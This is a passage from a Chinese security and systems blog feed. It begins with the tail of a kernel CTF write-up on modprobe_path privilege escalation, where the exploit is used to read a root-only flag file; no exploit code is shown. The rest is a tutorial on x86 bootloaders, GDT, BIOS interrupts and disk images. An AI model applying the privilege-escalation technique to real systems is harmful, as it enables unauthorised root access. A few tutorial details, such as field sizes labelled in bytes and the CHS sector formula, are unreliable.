<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chown</span> 0:0 flag</span><br><span class="line"><span class="built_in">chmod</span> 600 flag</span><br></pre></td></tr></table></figure></div>
<p>这里有可能可以成功，有时候执行exp时会崩溃退出，比较不稳定。而且我们自定义的可执行文件也不能直接执行<strong>/bin/sh</strong>拿到<strong>root
shell</strong>，一般只能用来把不可读的flag文件读取到一个指定的目录处。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3modprobe-path%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/image-20250412211417591.png"
                      class=""
                >
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始搭建自制操作系统——基础概念&amp;bootloader编写</title>
    <url>/blog/2025/04/29/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5-bootloader%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<h3 id="基础概念">基础概念</h3>
<h4 id="实模式与保护模式">实模式与保护模式</h4>
<table>
<colgroup>
<col style="width: 15%" />
<col style="width: 46%" />
<col style="width: 38%" />
</colgroup>
<thead>
<tr>
<th>特性</th>
<th>实模式（Real Mode）</th>
<th>保护模式（Protected Mode）</th>
</tr>
</thead>
<tbody>
<tr>
<td>CPU 架构</td>
<td>最初 8086</td>
<td>从 80286 起支持</td>
</tr>
<tr>
<td>最大寻址内存</td>
<td><strong>1MB</strong></td>
<td><strong>4GB（32位）或更高（64位）</strong></td>
</tr>
<tr>
<td>位宽</td>
<td>16 位</td>
<td>32 位（或后来的 64 位）</td>
</tr>
<tr>
<td>内存访问方式</td>
<td>段:偏移（Segment:Offset）</td>
<td>线性地址 + 分段/分页机制</td>
</tr>
<tr>
<td>支持分页</td>
<td>❌ 无</td>
<td>✅ 有</td>
</tr>
<tr>
<td>支持特权级</td>
<td>❌ 无</td>
<td>✅ 有（Ring 0~3）</td>
</tr>
<tr>
<td>多任务</td>
<td>❌</td>
<td>✅ 可以通过 TSS 实现</td>
</tr>
<tr>
<td>程序加载</td>
<td>BIOS 调用</td>
<td>操作系统加载器</td>
</tr>
<tr>
<td>中断管理</td>
<td>直接访问中断向量表（0x0000:0x0000）</td>
<td>支持 IDT + 更复杂的中断系统</td>
</tr>
</tbody>
</table>
<p><strong>实模式</strong>（Real Mode）</p>
<p><strong>段寄存器 + 偏移地址</strong> 访问内存：</p>
<ul>
<li>8086 的地址由 <code>segment * 16 + offset</code> 计算而得</li>
<li>示例：<code>CS = 0x1000</code>, <code>IP = 0x0010</code> → 实际地址
= <code>0x10000 + 0x10 = 0x10010</code></li>
</ul>
<p><strong>没有权限管理</strong>：</p>
<ul>
<li>所有程序都可以访问所有内存，没有保护，容易导致错误程序覆盖内存。</li>
</ul>
<p><strong>只能访问 1MB</strong>：</p>
<ul>
<li>虽然地址可以算出超过 1MB，但由于只使用 20 位地址线，超过部分会 wrap
around。</li>
</ul>
<p><strong>BIOS、bootloader 都运行在实模式</strong>：</p>
<ul>
<li>开机时 BIOS 会设置 CPU 为实模式，从 0x7c00 加载 MBR 并执行。</li>
</ul>
<p><strong>保护模式</strong>（Protected Mode）</p>
<p><strong>段寄存器不再直接表示物理地址</strong>：</p>
<ul>
<li>段寄存器变成 <strong>选择子（Selector）</strong>，用来索引
GDT（全局描述符表） 中的段描述符。</li>
<li>每个段描述符有：
<ul>
<li>基址（Base）</li>
<li>段限长（Limit）</li>
<li>访问权限（Read/Write, Ring0~Ring3 等）</li>
</ul></li>
</ul>
<p><strong>支持分页机制（Paging）</strong>：</p>
<ul>
<li>将虚拟地址 → 线性地址 → 物理地址，能隔离程序地址空间</li>
<li>支持内存保护、懒加载（demand paging）等高级特性</li>
</ul>
<p><strong>有中断描述符表（IDT）</strong>：</p>
<ul>
<li>支持更强的中断管理，异常处理，软中断等</li>
</ul>
<p><strong>支持多任务（TSS, 特权级切换）</strong>：</p>
<ul>
<li>Task State Segment（TSS）提供任务切换所需上下文保存</li>
<li>特权级（Ring0 内核，Ring3 用户程序）可防止非法访问</li>
</ul>
<p>从实模式进入保护模式需要：</p>
<ol type="1">
<li>设置好 GDT（将描述符数组地址传入GDTR寄存器）</li>
<li>设置 CR0 寄存器的 PE 位（bit 0）为 1</li>
<li>跳转到 32 位代码段执行</li>
</ol>
<h4 id="gdt">GDT</h4>
<p>GDT（Global Descriptor Table）</p>
<h5 id="gdtr寄存器">GDTR寄存器</h5>
<p>首先我们先来看一下GDTR寄存器的含义，其中基地址就是gdt具体的描述符数组的起始地址，而界限描述了描述符数组的大小，由于界限占两个字节，而每个描述符占8字节，所以理论上最多有<code>65536 / 8 = 8192</code>个描述符。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/29/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5-bootloader%E7%BC%96%E5%86%99/image-20250428143119979.png"
                      class=""
                >
<p>一般汇编实现如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lgdt [gdt_descriptor]   ; 加载全局描述符表（GDT）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdt_descriptor:</span><br><span class="line">    dw gdt_end - gdt_start - 1  ; limit，16bytes</span><br><span class="line">    dd gdt_start                ; base，32bytes</span><br></pre></td></tr></table></figure></div>
<p>GDT核心数据结构是一个描述符数组，每个描述符占8字节。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/29/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5-bootloader%E7%BC%96%E5%86%99/image-20250428141938872.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/29/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5-bootloader%E7%BC%96%E5%86%99/image-20250428150840394.png"
                      class=""
                >
<h5 id="gdt段描述符结构">GDT段描述符结构</h5>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/29/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5-bootloader%E7%BC%96%E5%86%99/image-20250428150926760.png"
                      class=""
                >
<p>其中Access各位表示如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/29/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5-bootloader%E7%BC%96%E5%86%99/image-20250428151033734.png"
                      class=""
                >
<ul>
<li>P：段是否存在于内存中。这个位一定要设为 <code>1</code>
才能被正常使用。</li>
<li>DPL：描述符的特权等级，共 2 位。值范围从<code>00</code>（Ring
0，内核）到 <code>11</code>（Ring 3，用户态）。</li>
<li>S：
<ul>
<li><strong>0</strong>：系统段（如 TSS、LDT、调用门等）。</li>
<li><strong>1</strong>：普通段（即代码段或数据段）。</li>
</ul></li>
<li>E：
<ul>
<li><strong>0</strong>：这是一个数据段。</li>
<li><strong>1</strong>：这是一个代码段，可以执行指令。</li>
</ul></li>
<li>DC：如果这是
<strong>数据段</strong>（E=0）：<strong>0</strong>表示段向上增长（通常情况）。<strong>1</strong>表示段向下增长（如堆栈段）。如果这是
<strong>代码段</strong>（E=1）：<strong>0</strong>表示<strong>非一致性（non-conforming）</strong>段，只能从相同特权级访问此段。<strong>1</strong>表示<strong>一致性（conforming）</strong>段，可以从更低权限的代码段跳转过来执行此段中的代码（但特权级不会改变）。</li>
<li>RW：如果是<strong>代码段</strong>（E=1）：<strong>0</strong>表示代码段不可读（不常用）；<strong>1</strong>表示代码段可读（大多数操作系统都设为可读）；两者都不可写。如果是<strong>数据段</strong>（E=0）：<strong>0</strong>表示数据段不可写；<strong>1</strong>表示数据段可读可写（正常的数据段通常设为可写）；两者都可读。</li>
<li>A：CPU 会在首次访问段时自动设置这一位为 1。如果该位初始为
0，则第一次访问会触发 CPU
设置这个位（需要段描述符可写）。如果段描述符是只读的内存区域（比如页表标记只读），就可能触发
page fault。一般直接置一。</li>
</ul>
<p>而flag各位表示如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/29/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5-bootloader%E7%BC%96%E5%86%99/image-20250428152445304.png"
                      class=""
                >
<ul>
<li><p>G：</p>
<ul>
<li><strong>0</strong>：limit 的单位是
<strong>字节（Byte）</strong>。</li>
<li><strong>1</strong>：limit 的单位是
<strong>4KB（Page）</strong>。可以更方便地表示大内存段。</li>
</ul></li>
<li><p>DB：</p>
<p><strong>对代码段</strong>（E=1）：</p>
<ul>
<li><strong>0</strong>：段中默认是 16 位指令（16
位保护模式代码段）。</li>
<li><strong>1</strong>：段中默认是 32 位指令（32
位保护模式代码段）。</li>
</ul>
<p><strong>对数据段</strong>（E=0）：</p>
<ul>
<li><strong>0</strong>：使用 16 位偏移。</li>
<li><strong>1</strong>：使用 32 位偏移。</li>
</ul></li>
<li><p>L：</p>
<p><strong>只用于代码段</strong></p>
<p><strong>0</strong>：不是 64 位代码段（也就是 16 位或 32 位段）。</p>
<p><strong>1</strong>：<strong>64
位代码段</strong>（<strong>仅在长模式下使用</strong>，也就是
x86_64）。</p></li>
</ul>
<blockquote>
<p>⚠️ 设置了 L=1 时，必须设置 D/B=0（它俩互斥）。</p>
</blockquote>
<p>汇编表示如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdt_start:</span><br><span class="line">gdt_null:               ; 空描述符</span><br><span class="line">    dq 0</span><br><span class="line"></span><br><span class="line">gdt_code:               ; 代码段描述符（base=0, limit=4GB, type=code）</span><br><span class="line">    dw 0xFFFF           ; limit low 16bits</span><br><span class="line">    dw 0x0000           ; base low 16bits</span><br><span class="line">    db 0x00             ; base middle 8bits</span><br><span class="line">    db 10011011b        ; flags 8bits</span><br><span class="line">    db 11001111b        ; limit high 4bits + flags 4bits</span><br><span class="line">    db 0x00             ; base high 8bits</span><br><span class="line"></span><br><span class="line">gdt_end:</span><br></pre></td></tr></table></figure></div>
<p>实际上GDT
的第一个描述符（<code>gdt_null</code>）是一个空描述符，它的作用是
<strong>占位</strong>，为了避免出现无效的段选择子。具体原因：</p>
<ul>
<li><strong>段选择子为 0（<code>gdt_null</code>）不被使用</strong>：GDT
中的第一个描述符是一个保留的空描述符，索引为 0
的选择子（<code>0x00</code>）从来不会被使用。这样可以防止程序错误地引用
GDT 中的第一个描述符。</li>
<li><strong>段选择子从 0x8 开始</strong>：实际有效的段选择子从
<code>0x08</code> 开始（第二个描述符）。这是因为描述符索引是基于 8
字节对齐的，所以 <code>gdt_code</code> 对应的选择子就是
<code>0x08</code>，即在 GDT 中的第一个有效描述符。</li>
</ul>
<p><strong>段选择子的计算</strong>：实际上段选择子是由 GDT
索引（<code>index</code>）计算出来的，公式如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Selector = (Index &lt;&lt; 3) | (TI &lt;&lt; 2) | RPL</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>Index</code>: GDT 中段描述符的索引。</li>
<li><code>TI</code>: 指示该段描述符是来自 GDT 还是 LDT，GDT 的
<code>TI = 0</code>。</li>
<li><code>RPL</code>: 请求的特权级（Ring 级别），通常内核模式使用
<code>RPL = 0</code>。</li>
</ul>
<h4 id="cr系列寄存器作用">CR系列寄存器作用</h4>
<p><strong>CR0 — 控制模式和开关</strong></p>
<table>
<thead>
<tr>
<th>位名</th>
<th>位号</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>PE</td>
<td>0</td>
<td>Protection Enable（置 1 开启保护模式）✅</td>
</tr>
<tr>
<td>MP</td>
<td>1</td>
<td>Monitor Coprocessor（浮点协处理）</td>
</tr>
<tr>
<td>EM</td>
<td>2</td>
<td>Emulation（禁用 FPU）</td>
</tr>
<tr>
<td>TS</td>
<td>3</td>
<td>Task Switched</td>
</tr>
<tr>
<td>ET</td>
<td>4</td>
<td>Extension Type（硬件兼容用）</td>
</tr>
<tr>
<td>NE</td>
<td>5</td>
<td>Numeric Error（启用内部异常处理）</td>
</tr>
<tr>
<td>WP</td>
<td>16</td>
<td>Write Protect（分页写保护）</td>
</tr>
<tr>
<td>AM</td>
<td>18</td>
<td>Alignment Mask（内存对齐检查）</td>
</tr>
<tr>
<td>PG</td>
<td>31</td>
<td>Paging（置 1 开启分页机制）✅</td>
</tr>
</tbody>
</table>
<p><strong>CR1 — 未定义（永远保留）</strong></p>
<p><strong>CR2 — 页面错误地址</strong></p>
<p>当触发 <strong>页面错误异常（#PF）</strong> 时，<code>CR2</code>
会保存访问的故障地址</p>
<p>这是处理分页错误的重要调试信息（比如缺页中断）</p>
<p><strong>CR3 — 页目录基地址寄存器（也叫 PDBR）</strong></p>
<p>当开启分页（<code>PG=1</code>）时：</p>
<ul>
<li><code>CR3</code> 要设置为 <strong>页目录（Page Directory）</strong>
的物理地址</li>
<li>操作系统每次切换进程时，都会更新
<code>CR3</code>，从而切换虚拟地址映射</li>
</ul>
<p><strong>CR4 — 启用新功能</strong></p>
<table>
<thead>
<tr>
<th>位名</th>
<th>位号</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>PSE</td>
<td>4</td>
<td>Page Size Extension（4MB 大页）</td>
</tr>
<tr>
<td>PAE</td>
<td>5</td>
<td>Physical Address Extension（36-bit 地址）</td>
</tr>
<tr>
<td>PGE</td>
<td>7</td>
<td>Page Global Enable（全局页）</td>
</tr>
<tr>
<td>OSFXSR</td>
<td>9</td>
<td>SSE 支持</td>
</tr>
<tr>
<td>...</td>
<td>...</td>
<td>更多高级功能</td>
</tr>
</tbody>
</table>
<h4 id="bios启动方式">BIOS启动方式</h4>
<p>BIOS 启动后，会寻找第一个可启动设备（通常是硬盘）。然后读取该设备
<strong>扇区 0（LBA 0）</strong> 的前 <strong>512 字节</strong> 到内存的
<code>0x7C00</code> 处执行。这 512 字节被称为
<strong>MBR（主引导记录）</strong>。该主引导记录格式如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Offset | 含义</span><br><span class="line">----------------------------</span><br><span class="line">0x000  | 启动代码（最多 446 字节）</span><br><span class="line">0x1BE  | 分区表（4 个分区，每个 16 字节）</span><br><span class="line">0x1FE  | 结束标志 0xAA55</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>所以写的 bootloader 必须非常精简，并以 0xAA55 结尾，才能被 BIOS
正确识别。</p>
</blockquote>
<p>启动时的第一个MB的内存布局如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/29/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5-bootloader%E7%BC%96%E5%86%99/image-20250428182429367.png"
                      class=""
                >
<h4 id="bios常用中断">BIOS常用中断</h4>
<table>
<thead>
<tr>
<th>中断号</th>
<th>用途</th>
<th>举例</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x10</td>
<td>显示输出</td>
<td>打印字符、设置文本/图形模式</td>
</tr>
<tr>
<td>0x13</td>
<td>磁盘读写</td>
<td>加载 stage2 / kernel</td>
</tr>
<tr>
<td>0x15</td>
<td>获取内存信息</td>
<td>用于内核初始化内存管理</td>
</tr>
<tr>
<td>0x16</td>
<td>获取键盘输入</td>
<td>等待用户按键</td>
</tr>
</tbody>
</table>
<p><strong>0x10中断</strong></p>
<table>
<colgroup>
<col style="width: 13%" />
<col style="width: 36%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr>
<th>功能号 (AH)</th>
<th>功能描述</th>
<th>输入参数（常用）</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>0x00</code></td>
<td>设置显示模式（Set Video Mode）</td>
<td>AL = 模式号（如 0x03 文本）</td>
</tr>
<tr>
<td><code>0x0E</code></td>
<td>TTY 模式输出字符（Print char）</td>
<td>AL = 字符，AH = 0x0E，BH = 页号，BL = 颜色</td>
</tr>
<tr>
<td><code>0x13</code></td>
<td>写字符串（Write string）</td>
<td>AL=写入方式, ES:BP=字符串地址, CX=字符数</td>
</tr>
</tbody>
</table>
<p>示例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ah, 0x0E</span><br><span class="line">mov al, &#x27;H&#x27;</span><br><span class="line">int 0x10           ; 打印一个字符</span><br></pre></td></tr></table></figure></div>
<p><strong>0x13中断</strong></p>
<table>
<colgroup>
<col style="width: 7%" />
<col style="width: 17%" />
<col style="width: 75%" />
</colgroup>
<thead>
<tr>
<th>功能号</th>
<th>功能描述</th>
<th>输入参数（常用）</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>0x02</code></td>
<td>读取扇区</td>
<td>AL = 扇区数, CH = 柱面, CL = 扇区, DH = 磁头, DL = 驱动器号, ES:BX =
缓冲区</td>
</tr>
<tr>
<td><code>0x03</code></td>
<td>写扇区</td>
<td>同上</td>
</tr>
<tr>
<td><code>0x08</code></td>
<td>获取驱动器参数</td>
<td>DL = 驱动器号（0x00 = floppy, 0x80 = HDD）</td>
</tr>
</tbody>
</table>
<ul>
<li>实模式下扇区读写有 BIOS 限制（如最大每次读 127 个扇区）</li>
<li>地址通过
<code>CH</code>（柱面）、<code>CL</code>（扇区）、<code>DH</code>（磁头）指定（CHS
模式）</li>
</ul>
<p>示例（读取 1 个扇区）：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ah, 0x02        ; 功能号：读扇区</span><br><span class="line">mov al, 0x01        ; 读取 1 个扇区</span><br><span class="line">mov ch, 0x00        ; 柱面 0</span><br><span class="line">mov cl, 0x02        ; 扇区 2</span><br><span class="line">mov dh, 0x00        ; 磁头 0</span><br><span class="line">mov dl, 0x00        ; 驱动器 0（软盘）</span><br><span class="line">mov bx, 0x8000      ; 缓冲区</span><br><span class="line">mov es, bx</span><br><span class="line">xor bx, bx</span><br><span class="line">int 0x13</span><br><span class="line">jc error            ; 如果 CF = 1，说明出错</span><br></pre></td></tr></table></figure></div>
<p><strong>0x15中断</strong></p>
<table>
<thead>
<tr>
<th>功能号 (AX)</th>
<th>功能描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>0xE820</code></td>
<td>获取可用内存映射（现代方式）</td>
</tr>
<tr>
<td><code>0xE801</code></td>
<td>获取内存大小（老方式）</td>
</tr>
<tr>
<td><code>0x88</code></td>
<td>获取扩展内存大小（单位 KB）</td>
</tr>
</tbody>
</table>
<p>示例：获取扩展内存</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ah, 0x88</span><br><span class="line">int 0x15</span><br><span class="line">; AX = 扩展内存大小（KB），最大到 65535KB = 64MB</span><br></pre></td></tr></table></figure></div>
<p><strong>0x16中断</strong></p>
<table>
<thead>
<tr>
<th>功能号 (AH)</th>
<th>功能描述</th>
<th>输出寄存器</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>0x00</code></td>
<td>等待并读取按键</td>
<td>AH = 扫描码，AL = ASCII</td>
</tr>
<tr>
<td><code>0x01</code></td>
<td>检查是否有键按下</td>
<td>ZF = 1 表示无按键</td>
</tr>
<tr>
<td><code>0x02</code></td>
<td>获取键盘状态</td>
<td>AL = 状态字节</td>
</tr>
</tbody>
</table>
<p>示例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ah, 0x00</span><br><span class="line">int 0x16</span><br><span class="line">; 等待用户按下任意键，返回的 ASCII 在 AL 中</span><br></pre></td></tr></table></figure></div>
<h4 id="加载流程设计">加载流程设计</h4>
<p>一般而言采用两阶段引导加载，因为一个扇区的512字节实在太少了</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">BIOS --&gt; bootloader (stage1, 512字节) --&gt; stage2 loader (几个扇区) --&gt; 加载 &amp; 跳转 kernel</span><br></pre></td></tr></table></figure></div>
<p>实际开发中需要 stage2的原因如下：</p>
<table>
<colgroup>
<col style="width: 41%" />
<col style="width: 58%" />
</colgroup>
<thead>
<tr>
<th>原因</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>bootloader 的大小限制</strong></td>
<td>MBR（第一个扇区）只有 512 字节，其中 BIOS 要求最后两个字节是
<code>0x55AA</code>，真正能用的只有 <strong>446
字节左右</strong>，太小了，根本放不下文件系统解析、GDT、分页、ELF解析等功能。</td>
</tr>
<tr>
<td><strong>内核格式可能是 ELF/复杂结构</strong></td>
<td>操作系统内核常用的是 <code>ELF</code> 格式，需要解析段表（program
headers）、加载多个段、重定位。bootloader 不足以处理这些格式。</td>
</tr>
<tr>
<td><strong>加载多个扇区太麻烦</strong></td>
<td><code>boot.bin</code> 不支持 FAT、EXT
等文件系统，无法定位内核的位置，只能靠硬编码 LBA 扇区号，比较脆弱。</td>
</tr>
<tr>
<td><strong>需要更灵活的设置（分页、多核、多任务）</strong></td>
<td>stage2
可以做更复杂的初始化，比如启用分页、加载多核、准备内核参数等，boot.bin
装不下这些逻辑。</td>
</tr>
<tr>
<td><strong>保持职责清晰</strong></td>
<td>boot 只负责最小化地进入一个“干净的 32 位环境”，stage2
才开始进行高级的系统初始化和内核加载。</td>
</tr>
</tbody>
</table>
<h4 id="ld链接脚本">ld链接脚本</h4>
<p><code>ld</code> 是 GNU
的链接器（Linker），它把多个目标文件（<code>.o</code>
文件）链接成一个最终的可执行程序。<code>.ld</code> 文件告诉链接器：</p>
<ul>
<li>程序从哪里开始执行（<code>ENTRY(...)</code>）</li>
<li>各个段（<code>.text</code>, <code>.data</code>,
<code>.bss</code>）应该放到内存的哪个地址</li>
<li>各个段的排列顺序和对齐方式</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ENTRY(_start)       /* 程序入口，定义了主函数 */</span><br><span class="line"></span><br><span class="line">SECTIONS &#123;</span><br><span class="line">    . = 0x1000;      /* 从内存地址 0x1000 开始加载 */</span><br><span class="line"></span><br><span class="line">    .text : &#123;</span><br><span class="line">        *(.text)     /* 收集所有 .text 段（代码段） */</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .rodata : &#123;</span><br><span class="line">        *(.rodata)   /* 只读数据，比如字符串常量 */</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .data : &#123;</span><br><span class="line">        *(.data)     /* 已初始化的数据段 */</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .bss : &#123;</span><br><span class="line">        *(.bss COMMON) /* 未初始化的数据段（清零） */</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<table>
<colgroup>
<col style="width: 30%" />
<col style="width: 69%" />
</colgroup>
<thead>
<tr>
<th>语法</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ENTRY(_start)</code></td>
<td>指定程序入口为 <code>_start</code> 标签</td>
</tr>
<tr>
<td><code>.</code></td>
<td>当前地址指针，<code>. = 0x1000</code> 表示链接从 0x1000 开始</td>
</tr>
<tr>
<td><code>.text : &#123; *(.text) &#125;</code></td>
<td>把所有目标文件里的 <code>.text</code> 段收集放入 <code>.text</code>
区</td>
</tr>
<tr>
<td><code>*(...)</code></td>
<td>星号表示“所有目标文件中”的匹配段</td>
</tr>
<tr>
<td><code>.bss COMMON</code></td>
<td><code>COMMON</code> 表示未初始化的变量也放进 <code>.bss</code></td>
</tr>
</tbody>
</table>
<h4 id="构成启动盘镜像">构成启动盘镜像</h4>
<p>一般使用dd指令来构建启动盘镜像，基本格式为<code>dd if="输入文件" of="输出文件" bs="数据块" count="数量"</code>，seek=n表示从文件偏移n×bs开始写。我们启动过程一般需要以如下方式构建启动盘镜像。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=floppy.img bs=512 count=2880                    <span class="comment"># 创建空白软盘镜像（512 * 2880 = 1.44MB）</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=boot.bin of=floppy.img bs=512 count=1 conv=notrunc           <span class="comment"># 写入 bootloader</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=stage2.bin of=floppy.img bs=512 count=2 seek=1 conv=notrunc  <span class="comment"># 写入 stage2（2 扇区 = 1024 字节）</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=kernel.bin of=floppy.img bs=512 seek=3 conv=notrunc          <span class="comment"># 写入 kernel（从第3扇区）</span></span><br></pre></td></tr></table></figure></div>
<p>所以后续我们写好boot.asm，stage2.asm，kernel.c后就可以靠makefile一键编译打包好成一个软盘，然后用qemu启动。</p>
<h4 id="扇区地址结构chs">扇区地址结构CHS</h4>
<p>这个结构使用柱面（Cylinder）、磁头（Head）和扇区（Sector）来定位数据。</p>
<ul>
<li><strong>柱面
(Cylinder)</strong>：硬盘或软盘的物理圆柱体，所有具有相同轨道位置的扇区属于同一个柱面。</li>
<li><strong>磁头
(Head)</strong>：硬盘或软盘的磁头，负责读取和写入数据。通常有多个磁头，分布在多个柱面上。</li>
<li><strong>扇区
(Sector)</strong>：硬盘或软盘的最小数据单元，一个扇区通常为 512
字节。</li>
</ul>
<p>硬盘的物理布局通常是以“柱面 × 磁头 × 扇区”进行划分的。</p>
<p><strong>地址计算</strong></p>
<p>假设有如下的磁盘参数：</p>
<ul>
<li><strong>柱面数 (C)</strong>：通常取决于硬盘或软盘的容量。</li>
<li><strong>磁头数
(H)</strong>：也取决于硬盘或软盘的结构，一般来说，硬盘的每个磁盘面会有多个磁头。</li>
<li><strong>扇区数
(S)</strong>：每个磁头的一个柱面上有多个扇区，通常一个柱面有 63
个扇区（对于传统的硬盘，软盘是 18）。</li>
</ul>
<p>每个扇区的物理地址可以通过以下公式计算：</p>
<ul>
<li><strong>柱面 (Cylinder) =
<code>address / (heads \* sectors)</code></strong></li>
<li><strong>磁头 (Head) =
<code>(address / sectors) % heads</code></strong></li>
<li><strong>扇区 (Sector) = <code>address % sectors</code></strong></li>
</ul>
<p>QEMU 模拟的软盘与真实硬盘的物理参数有所不同。QEMU
默认模拟的软盘参数通常是标准的 1.44MB 软盘格式，具体来说，它的常见 CHS
参数如下：</p>
<ul>
<li><p><strong>磁头数 (Heads)</strong>：通常为
2（即双面软盘）。</p></li>
<li><p><strong>每柱面扇区数 (Sectors per Cylinder)</strong>：通常为 18
个扇区。</p></li>
<li><p><strong>柱面数 (Cylinders)</strong>：软盘总共约 80
个柱面，计算方法是：<code>总扇区数 / (扇区数/柱面 * 磁头数)</code>。例如，1.44MB
软盘总共有 2880 个扇区（1.44MB = 1440KB，1 扇区 = 512 字节，2880 =
1440KB / 512B）。所以柱面数为： <span class="math display">\[
2880 ÷ (18 \times 2) = 80 \text{ 柱面}
\]</span></p></li>
</ul>
<p>所以 QEMU 模拟的 1.44MB 软盘的 CHS 参数通常为：</p>
<ul>
<li><strong>柱面数 (Cylinder)</strong>：80</li>
<li><strong>磁头数 (Head)</strong>：2</li>
<li><strong>扇区数 (Sector)</strong>：18</li>
</ul>
<p>我们可以通过<code>qemu-img info floppy.img</code>来查看磁盘的基本信息。</p>
<h3 id="调试方法">调试方法</h3>
